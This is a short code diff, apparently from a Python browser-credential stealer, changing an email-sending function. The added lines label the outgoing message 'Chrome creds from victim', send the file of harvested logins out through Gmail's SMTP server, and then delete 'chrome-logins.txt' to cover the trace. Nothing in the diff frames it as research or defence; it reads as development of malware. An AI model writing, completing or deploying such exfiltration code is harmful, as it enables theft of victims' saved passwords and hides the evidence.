@@ -108,8 +108,8 @@ def send_email():
     email_password = ""
     email_receiver = ""
 
-    subject = "Test 1"
-    body = "This is an attachment"
+    subject = "Chrome creds from victim"
+    body = "Attachment..."
 
     msg = EmailMessage()
     msg["From"] = email_sender
@@ -126,6 +126,9 @@ def send_email():
     with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
         smtp.login(email_sender, email_password)
         smtp.send_message(msg)
+
+    # Remove the file
+    os.remove("chrome-logins.txt")
 
 
 if __name__ == "__main__":
